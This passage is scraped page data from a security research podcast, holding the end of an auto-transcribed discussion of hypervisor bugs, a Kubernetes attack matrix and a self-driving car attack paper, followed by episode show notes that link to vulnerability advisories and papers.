campaign. But like I've never heard about any sort of attack like this being done in the wild like and I just mean in general against the AI self-driving cars if this style that isn't to say in the future we won't see up at this point I don't know if that actually happening\", \"start\": 7178.6}, {\"speaker\": 3, \"line\": \" she's got a regiment like a full like team of people who just drive around with cars with tilted couches on the top trying to cause accidents on the freeway yep there you go nude new malware campaign targeting targeting cars but yeah no it's definitely it's more of a fun paper it does have some potential real world implications but it's more just you know fun and concept the actual attack like the math behind it and stuff isn't too interesting or two important I don't think I think it's more just what you were Saying with you know, the potential of like of real-world objects causing that yeah on anti sold out of its don't\", \"start\": 7257.3}, {\"speaker\": 1, \"line\": \" like you said. It's a fun attacked fun issue. Yeah,\", \"start\": 7294.3}, {\"speaker\": 3, \"line\": \" so we'll segue into some shoutouts. We have a shout out for another Microsoft breakdown and it lays out an attack Matrix for hitting kubernetes containers systems.\", \"start\": 7298.5}, {\"speaker\": 1, \"line\": \" Yeah, and I mean, we're not going to cover it. They do like the matriot acts tile breakdown of Of it. It's just a good reference\", \"start\": 7309.4}, {\"speaker\": 3, \"line\": \" for the table of like a bunch of different attacker goals that you would go for. So yeah.\", \"start\": 7320.7}, {\"speaker\": 1, \"line\": \" Well, so that's the attack Matrix the mystery attack Matrix.\", \"start\": 7326.2}, {\"speaker\": 3, \"line\": \" Yeah. It's kind of your goals and\", \"start\": 7330.2}, {\"speaker\": 1, \"line\": \" different attacks there. Yeah, it's just we talked about another breakdown. I think when we were talking about CFI, or was it the Rock one? Now am I supposed to\", \"start\": 7332.8}, {\"speaker\": 3, \"line\": \" know it was episode 32 and we were talking about memory tagging.\", \"start\": 7341.7}, {\"speaker\": 1, \"line\": \" Yeah, that's what it was. Well, yeah, and they just kind of broke down kind of some of the attacks are so I saw this and I was there it's another little break down. I'll say this one is specifically a breakdown. Where's the other one? The breakdown was kind of Just the tangent to the actual topic of the memory tagging.\", \"start\": 7344.6}, {\"speaker\": 3, \"line\": \" Yeah, the other was more of an\", \"start\": 7364.2}, {\"speaker\": 1, \"line\": \" analysis. Yeah, so I don't know I saw this though and figure some of you might find it. I find it somewhat interesting to give a read over or to use it as Biff a reference on a\", \"start\": 7365.2}, {\"speaker\": 3, \"line\": \" pen test. Yeah. Yeah, it's I like Microsoft's breakdowns. I like how they have like the general overview that's like really easy to understand up front and then they have like those breakdowns further on if you want more information on any specific issue. I like that like style of breakdown Microsoft does a good job with those.\", \"start\": 7377.1}, {\"speaker\": 1, \"line\": \" So yeah, I think they did a good job here. They don't go like too far in in detail with anything. It is a very much an overview of different attack methods different things you can be looking for not. Not super specific most of the time\", \"start\": 7395.4}, {\"speaker\": 3, \"line\": \" not a guide.\", \"start\": 7411.2}, {\"speaker\": 1, \"line\": \" Yeah, but yeah, I agree. I like it. That's it's a\", \"start\": 7412.1}, {\"speaker\": 3, \"line\": \" shout-out. You also had another shutout with project zero. Yeah project zero post.\", \"start\": 7415.6}, {\"speaker\": 1, \"line\": \" Yeah. I mean we often end up talking about them. This one I didn't feel is quite worth actually discussing on the episode. But another post from Maddie Stone who we've talked about her work on another I want to say we talked about with WhatsApp exploits but um, yeah, she put out another post they're worth of rate. It's an older vulnerability. That's why we're not going to cover in depth, but if you don't already follow project zero, there are zero length. They have a new post\", \"start\": 7421.5}, {\"speaker\": 3, \"line\": \" out. Yeah. There you go. I have a shadow. I saw this being mentioned. There was a Frack paper for the first time in a little while. I think the last Frack paper was in February, maybe\", \"start\": 7454.6}, {\"speaker\": 1, \"line\": \" yeah. Yes, I mean, so Paper part of their paper feed. Yeah, although I didn't notice actually when I went to the homepage a Frac to go pull this off, but they do have a call for papers. That's as far as I know is somewhat recent and I don't think fracture dropped an actual Zine since 16. I want to say was the\", \"start\": 7465.9}, {\"speaker\": 3, \"line\": \" last one. Yeah, it's been a while.\", \"start\": 7489.5}, {\"speaker\": 1, \"line\": \" So yeah, there are looking for papers. I'm not sure how long ago they put up the cfp or if maybe I maybe I should have looked at that\", \"start\": 7492.9}, {\"speaker\": 3, \"line\": \" butt. We'll go to the Wayback machine get it get a time set. But um, yeah this Frac paper specifically it talks about bugs that this researcher found in the FreeBSD beehive hypervisor, which you know, I don't think I've seen much about I don't think it's like very popular but you know anything with hypervisors and stuff is always fun to look at because of how low level it is. And one of the bugs is in the VGA emulation subsystem, and it's an out-of-bounds access. Pallet memory via integer overflow and that memory is used for like pixel entries for DACA dress reading right mode registers. And the problem is they end up using 32-bit indexes when they should have been 8-bit indexes because only values of to hunt to 256 expected and the wraparound is expected on that too. But because they use integers instead of chars or un dates you could actually end up reading or writing out of bounds and because you get those two, To both read and write those two Primitives together very powerful because you can use that to both leak and corrupt Heap data the other bug seem to be unrelated. That was a bug in the firmware configuration device, which allows the guests to retrieve host provided information like the virtual CPU count for example, and it's kind of similar to the first issue its assigned in this issue and one of her Quest structures. So something that should have been unsigned is treated as signed and because of that there's a discrepancy between the allocation a The copy length and you end up getting an overflow this article goes through all the technical details of both vulnerabilities and how the first one can get code execution the second one. They don't go as far as code execution. They get arbitrary read right, but you know, like I was saying earlier arbitrary regretted super-powerful you can get code execution from that if you take it further. Yeah\", \"start\": 7501.2}, {\"speaker\": 1, \"line\": \" one thing I did find I wanted to give it a one thing. I did find interesting with this one is they do also talk about inning to bypass or deal with CFI and doing raw pin that are well. Obviously CFI isn't blocking a raw, but they do talk about see if I as you know in an ending up pushing them towards thing to do wrong. I was just I was just interesting little reminder there that yeah, see if I see coming that said Yeah, there are ways around that we've had a little bit I won't say Doom and Gloom. I think we've because we've talked about by passing it a few times but you know, it's just it'll be like a SLR and dap it all stopped some exploits, but naturally or will find ways around it. But yeah, I thought it was just interesting real world and looking at getting around safe stack getting around CFI.\", \"start\": 7613.5}, {\"speaker\": 3, \"line\": \" Yeah, so, you know really want to show this out just because when you're talking about like exploiting at the hypervisor level resources are a lot more scarce for that compared to other, you know, like web exploitation or just you know, higher level binary exploitation. Oh and and the Frac papers are generally like pretty good like they're vetting processes. Awesome. So\", \"start\": 7668.9}, {\"speaker\": 1, \"line\": \" yeah, and I will Lampkin Rock are worth reading it will mention on that. Actually that cfp 70 has actually been up since like 2016. So definitely not\", \"start\": 7688.9}, {\"speaker\": 3, \"line\": \" new. Oh, okay fair enough and then zi you had another show note with you want to be a web security\", \"start\": 7699.4}, {\"speaker\": 1, \"line\": \" researcher? Yeah, and this is an older thing. Actually apparently it was updated just last month, but it's from like 2018. I just first came across every SLI, and I know we have some people who do like the bug Bounties and more web stuff and I thought I since I just came across as I thought it was a really good write-up of going about actually getting into the research not just repeating what everybody else is done, but getting into actually doing some new research and I think it actually applies more generally. It's while a talk specifically about web stuff. Yeah, it has advice about like if you come across a good quality blog post read the entire archive well, maybe help me find some forgotten tidbits and using that older information to build off of that find yeah it actually makes your hunt for forgotten knowledge no idea is to supid things like that it's a good write-up even if you're not not necessarily going to do web stuff I think it's still relevant or you could still apply a lot of this to just security research in general yeah it's older but since I just came across it I figured I'd give it a mention that's for sure well\", \"start\": 7707.0}, {\"speaker\": 3, \"line\": \" so that pretty much you know includes all of our topics will wrap up the show here thanks to everyone who tuned in it was cool to get ante on for like that you know 30 minutes that he was honorably it\", \"start\": 7781.9}, {\"speaker\": 1, \"line\": \" again yeah it's been it's\", \"start\": 7793.5}], \"speakers\": {\"3\": \"Specter\", \"1\": \"zi\", \"2\": \"anti\"}, \"offset\": \"8\", \"youtube\": \"0NS8tgeid9M\"}\nTRANSCRIPT--><!--kg-card-end: html-->","slug":"episode-36"}},{"node":{"title":"Episode 35 - A shortcut (.lnk) to RCE, Pi-Hole, Shadow Stacks, and fine-grained kASLR","path":"/posts/episode-35/","date":"31 March 2020","description":"Is there a shortcut to RCE? Well, on Windows .LNK files could be just that. We also talk about a few others vulnerabilities impacting Windows, Pi-Hole and Netflix. And end by looking at Window's new hardware enforced Shadow Stack and a proof-of-concept for fine-grained kASLR on Linux.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/xtvywtRRg9I\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Is there a shortcut to RCE? Well, on Windows .LNK files could be just that. We also talk about a few others vulnerabilities impacting Windows, Pi-Hole and Netflix. And end by looking at Window's new hardware enforced Shadow Stack and a proof-of-concept for fine-grained kASLR on Linux.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=86\">00:01:26</a>] <a href=\"https://arstechnica.com/information-technology/2020/03/bugcrowd-tries-to-muzzle-hacker-who-found-netflix-account-compromise-weakness/\">The Netflix account compromise Bugcrowd doesn't want you to know about</a><br />\n\t<ul><li><a href=\"https://bugcrowd.com/netflix\">https://bugcrowd.com/netflix</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=989\">00:16:29</a>] <a href=\"https://medium.com/@aniltom/where-is-my-train-tracking-to-hacking-d388e4b97225\">Where is my Train : Tracking to Hacking</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=1387\">00:23:07</a>] <a href=\"https://videocardz.com/newz/exclusive-intel-rocket-lake-s-features-pci-express-4-0-xe-graphics\">Intel SGX removed from Rocket Skylake-S CPUs</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=1705\">00:28:25</a>] <a href=\"https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/adv200006\">Type 1 Font Parsing Remote Code Execution Vulnerability</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=2029\">00:33:49</a>] <a href=\"https://seclists.org/fulldisclosure/2020/Mar/44\">Configuration Overwrite in IBM Cognos TM1 [CVE-2019-4716]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=2547\">00:42:27</a>] <a href=\"https://www.zerodayinitiative.com/blog/2020/3/25/cve-2020-0729-remote-code-execution-through-lnk-files\">Remote Code Execution Through .LNK Files [CVE-2020-0729]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=3203\">00:53:23</a>] <a href=\"https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/\">Pi-hole Remote Code Execution [CVE-2020-8816]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=3802\">01:03:22</a>] <a href=\"https://hackerone.com/reports/803141\">NordVPN - Unauthorized User Can Delete Any User Account</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=4181\">01:09:41</a>] <a href=\"https://research.nccgroup.com/2020/03/24/smart-contracts-inside-sgx-enclaves-common-security-bug-patterns/\">Smart Contracts Inside SGX Enclaves: Common Security Bug Patterns</a><br />\n\t<ul><li><a href=\"https://blockchain-ctf.securityinnovation.com/#/\">https://blockchain-ctf.securityinnovation.com/#/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=4836\">01:20:36</a>] <a href=\"https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815\">Understanding Hardware-enforced Stack Protection</a><br />\n\t<ul><li><a href=\"https://windows-internals.com/cet-on-windows/\">https://windows-internals.com/cet-on-windows/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=5549\">01:32:29</a>] <a href=\"https://lore.kernel.org/kernel-hardening/20200205223950.1212394-1-kristen@linux.intel.com/\">[RFC PATCH 00/11] Finer grained kernel address space randomization - Kristen Carlson Accardi</a><br />\n\t<ul><li><a href=\"https://www.kryptoslogic.com/blog/2020/03/another-look-at-two-linux-kaslr-patches/\">https://www.kryptoslogic.com/blog/2020/03/another-look-at-two-linux-kaslr-patches/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=xtvywtRRg9I&t=6142\">01:42:22</a>] <a href=\"https://slayerlabs.com/\">Slayer Labs </a><br />\n\t<ul><li><a href=\"https://www.reddit.com/r/netsec/comments/fr8w8u/free_vpn_access_to_slayer_labs_networks/?sort=top\">https://www.reddit.com/r/netsec/comments/fr8w8u/free_vpn_access_to_slayer_labs_networks/?sort=top</a><br /></li></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-35"}},{"node":{"title":"Episode 34 - Pwn2Own Results, Voatz (again), some web-exploits and a code-reuse mitigation","path":"/posts/episode-34/","date":"24 March 2020","description":"More discussion about election hacking with Voatz undergoing a more complete security assessment, we also discuss a few interesting web attacks and end with a good discussion about a new code-reuse mitigation: Hurdle.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/nw8EDKCKrWo\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>More discussion about election hacking with Voatz undergoing a more complete security assessment, we also discuss a few interesting web attacks and end with a good discussion about a new code-reuse mitigation: Hurdle.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=28\">00:00:28</a>] <a href=\"/posts/learn-exploit-development-while-not-dying-from-covid-19/\">Learn Exploit Development While Not Dying</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=138\">00:02:18</a>] <a href=\"https://exploit.education/\">Exploit Education</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=460\">00:07:40</a>] <a href=\"https://www.thezdi.com/blog/2020/3/19/pwn2own-2020-day-one-results\">Pwn2Own Results</a><br />\n\t<ul><li><a href=\"https://www.zerodayinitiative.com/blog/2020/3/19/pwn2own-2020-day-one-results\">https://www.zerodayinitiative.com/blog/2020/3/19/pwn2own-2020-day-one-results</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=987\">00:16:27</a>] <a href=\"https://oooverflow.io/dc-ctf-2020-quals/\">DEF CON CTF 2020 QUALS COVID-19 DELAY</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=1358\">00:22:38</a>] <a href=\"https://jobs.apple.com/en-us/details/200144575/software-engineer\">Software Engineer - Jobs at Apple</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=1864\">00:31:04</a>] <a href=\"https://safekeepsecurity.com/about/cve-2020-10558/\">Tesla Model 3 Denial of Service Vulnerability [CVE-2020-10558]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=2194\">00:36:34</a>] <a href=\"https://github.com/trailofbits/publications/blob/master/reviews/voatz-securityreview.pdf\">Trail of Bits - Voatz Security Review</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=3717\">01:01:57</a>] <a href=\"https://honoki.net/2020/03/18/xxe-scape-through-the-front-door-circumventing-the-firewall-with-http-request-smuggling/\">XXE-scape through the front door: circumventing the firewall with HTTP request smuggling</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=4100\">01:08:20</a>] <a href=\"https://blog.doyensec.com/2020/03/16/vscode_codeexec.html\">Don't Clone That Repo: Visual Studio Code^2 Execution</a><br />\n\t<ul><li><a href=\"https://github.com/doyensec/VSCode_PoC_Oct2019/\">https://github.com/doyensec/VSCode_PoC_Oct2019/</a><br /></li><li><a href=\"https://github.com/doyensec/VSCode_PoC_Oct2019/blob/master/.vscode/settings.json\">https://github.com/doyensec/VSCode_PoC_Oct2019/blob/master/.vscode/settings.json</a><br /></li><li><a href=\"https://github.com/doyensec/VSCode_PoC_Oct2019/commit/19b4687259bd5d1821525a3ebbe6aa76618359c3#diff-62b00de1d62bb867ef03dec7057712f1R50\">https://github.com/doyensec/VSCode_PoC_Oct2019/commit/19b4687259bd5d1821525a3ebbe6aa76618359c3#diff-62b00de1d62bb867ef03dec7057712f1R50</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=4470\">01:14:30</a>] <a href=\"https://hackerone.com/reports/604534\">[Hacker101] Race Condition leads to undeletable group member</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=4806\">01:20:06</a>] <a href=\"https://portswigger.net/research/javascript-without-parentheses-using-dommatrix\">JavaScript without parentheses using DOMMatrix</a><br />\n\t<ul><li><a href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked\">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=nw8EDKCKrWo&t=5069\">01:24:29</a>] <a href=\"https://dl.acm.org/doi/abs/10.1145/3373376.3378506\">Hurdle: Securing Jump Instructions Against Code Reuse Attacks</a><br />\n\t<ul><li><a href=\"https://www.youtube.com/watch?v=qFWTZ2zZ1XQ\">https://www.youtube.com/watch?v=qFWTZ2zZ1XQ</a><br /></li><li><a href=\"http://se.ri0.us/2020-03-23-110829182-9e1b1.png\">http://se.ri0.us/2020-03-23-110829182-9e1b1.png</a><br /></li></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-34"}},{"node":{"title":"Episode 33 - How to Hack a CTF and more (LVI, TRRespass and some web-exploits)","path":"/posts/episode-33/","date":"17 March 2020","description":"Start off by looking at a few Google Cloud attacks, a couple named vulns (LVI: Load Value Injection, and TRRespass) and then into some web-focused exploits including how to hack a CTF.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/Ppl066XLCpM\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Start off by looking at a few Google Cloud attacks, a couple named vulns (LVI: Load Value Injection, and TRRespass) and then into some web-focused exploits including how to hack a CTF.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=23\">00:00:23</a>] <a href=\"https://www.zerodayinitiative.com/blog/2020/3/12/regarding-pwn2own-vancouver\">P2O Vancouver now remote-only</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=258\">00:04:18</a>] <a href=\"https://security.googleblog.com/2020/03/announcing-our-first-gcp-vrp-prize.html\">Announcing our first GCP VRP Prize winner and updates to 2020 program</a><br />\n\t<ul><li><a href=\"https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/\">https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=1124\">00:18:44</a>] <a href=\"https://blog.12security.com/whisper-essay-1-guilty-as-hell/\">Whisper has exposed all user information</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=1698\">00:28:18</a>] <a href=\"https://lviattack.eu/\">LVI: Hijacking Transient Execution with Load Value Injection</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=2361\">00:39:21</a>] <a href=\"https://www.vusec.net/projects/trrespass/\">TRRespass: Exploiting the Many Sides ofTarget Row Refresh</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=2845\">00:47:25</a>] <a href=\"https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/\">The unexpected Google wide domain check bypass</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=3402\">00:56:42</a>] <a href=\"https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/\">Facebook OAuth Framework Vulnerability</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=4004\">01:06:44</a>] <a href=\"https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0\">JSON CSRF with method override technique</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=4408\">01:13:28</a>] <a href=\"https://medium.com/ctf-writeups/breaking-the-competition-bug-bounty-write-up-ca7cb7bc53f5\">Breaking the Competition</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=5014\">01:23:34</a>] <a href=\"https://hackerone.com/reports/333419\">[Slack] TURN server allows TCP and UDP proxying to internal network</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=5176\">01:26:16</a>] <a href=\"https://hackerone.com/reports/737140\">[Slack] HTTP Request Smuggling to steal session cookies</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=5454\">01:30:54</a>] <a href=\"https://hackerone.com/reports/531032\">[Slack] DTLS uses a private key that is in the public domain</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=5583\">01:33:03</a>] <a href=\"https://hackerone.com/reports/753971\">[htmr] DOM-based XSS</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=6136\">01:42:16</a>] <a href=\"https://arxiv.org/abs/2003.03850v1\">A Compiler Assisted Scheduler for Detecting and Mitigating Cache-Based Side Channel Attacks</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=Ppl066XLCpM&t=6608\">01:50:08</a>] <a href=\"https://arxiv.org/abs/2003.05503v1\">Bypassing memory safety mechanisms through speculative control flow hijacks</a><br />\n\t<ul></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-33"}},{"node":{"title":"Episode 32 - FuzzBench, MediaTek-su, Request Smuggling, and Memory Tagging","path":"/posts/episode-32/","date":"10 March 2020","description":"A New AMD sidechannel, and an old Intel CSME attack, a couple deserialization attacks, and a few clever but not terribly useful attacks, and some discussion about memory tagging on this weeks episode of DAY[0].","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/q3mwrqcv8eY\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>A New AMD sidechannel, and an old intel CSME attack, a couple deserialization attacks, and a few clever but not terribly useful attacks, and some discussion about memory tagging on this weeks episode of DAY[0].</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=29\">00:00:29</a>] <a href=\"https://www.bugcrowd.com/blog/election-security-disinformation/\">Election Security 2020: Don't Let Disinformation Undermine Your Right to Vote</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=420\">00:07:00</a>] <a href=\"https://www.thezdi.com/blog/2020/3/3/announcing-remote-participation-in-pwn2own-vancouver\">Announcing Remote Participation in Pwn2Own Vancouver</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=690\">00:11:30</a>] <a href=\"https://community.letsencrypt.org/t/revoking-certain-certificates-on-march-4/114864\">Revoking certain certificates on March 4</a><br />\n\t<ul><li><a href=\"https://community.letsencrypt.org/t/2020-02-29-caa-rechecking-bug/114591/3\">https://community.letsencrypt.org/t/2020-02-29-caa-rechecking-bug/114591/3</a><br /></li><li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1619047\">https://bugzilla.mozilla.org/show_bug.cgi?id=1619047</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=1188\">00:19:48</a>] <a href=\"https://security.googleblog.com/2020/03/fuzzbench-fuzzer-benchmarking-as-service.html\">FuzzBench: Fuzzer Benchmarking as a Service</a><br />\n\t<ul><li><a href=\"https://www.fuzzbench.com/reports/sample/index.html\">https://www.fuzzbench.com/reports/sample/index.html</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=1741\">00:29:01</a>] <a href=\"http://blog.ptsecurity.com/2020/03/intelx86-root-of-trust-loss-of-trust.html\">Intel x86 Root of Trust: loss of trust </a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=2355\">00:39:15</a>] <a href=\"https://mlq.me/download/takeaway.pdf\">Take A Way: Exploring the Security Implications of AMD's Cache Way Predictors</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=2959\">00:49:19</a>] <a href=\"https://www.kb.cert.org/vuls/id/782301/\">VU#782301 - pppd vulnerable to buffer overflow due to a flaw in EAP packet processing</a><br />\n\t<ul><li><a href=\"https://github.com/paulusmack/ppp/commit/8d45443bb5c9372b4c6a362ba2f443d41c5636af\">https://github.com/paulusmack/ppp/commit/8d45443bb5c9372b4c6a362ba2f443d41c5636af</a><br /></li><li><a href=\"https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426\">https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=3319\">00:55:19</a>] <a href=\"https://www.xda-developers.com/mediatek-su-rootkit-exploit/amp/\">MediaTek rootkit affecting millions of Android devices</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=3724\">01:02:04</a>] <a href=\"https://srcincite.io/advisories/src-2020-0011/\">Zoho ManageEngine RCE</a><br />\n\t<ul><li><a href=\"https://srcincite.io/pocs/src-2020-0011.py.txt\">https://srcincite.io/pocs/src-2020-0011.py.txt</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=4293\">01:11:33</a>] <a href=\"https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server\">RCE Through a Deserialization Bug in Oracle's WebLogic Server (CVE-2020-2555)</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=4470\">01:14:30</a>] <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-h4mf-75hf-67w4\">Regex Vulnerabilities - parse-community/parse-server</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=4745\">01:19:05</a>] <a href=\"https://hackerone.com/reports/735748\">HTTP request smuggling using malformed Transfer-Encoding header</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=5248\">01:27:28</a>] <a href=\"https://hackerone.com/reports/220385\">[Nextcloud] Delete All Data of Any User</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=5444\">01:30:44</a>] <a href=\"https://tches.iacr.org/index.php/TCHES/article/view/8546\">Dismantling DST80-based Immobiliser Systems</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=5881\">01:38:01</a>] <a href=\"https://arxiv.org/abs/2003.01031v1\">Exploring Backdoor Poisoning Attacks Against Malware Classifiers</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=6367\">01:46:07</a>] <a href=\"https://arxiv.org/abs/2003.00916v1\">Code Renewability for Native Software Protection</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=6950\">01:55:50</a>] <a href=\"https://github.com/microsoft/MSRC-Security-Research/blob/master/papers/2020/Security%20analysis%20of%20memory%20tagging.pdf\">Security Analysis of Memory Tagging</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=q3mwrqcv8eY&t=7463\">02:04:23</a>] <a href=\"https://arxiv.org/abs/2003.00916v1\">DangKiller: Eliminating Dangling Pointers Efficiently via Implicit Identifier</a><br />\n\t<ul></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-32"}},{"node":{"title":"Episode 31 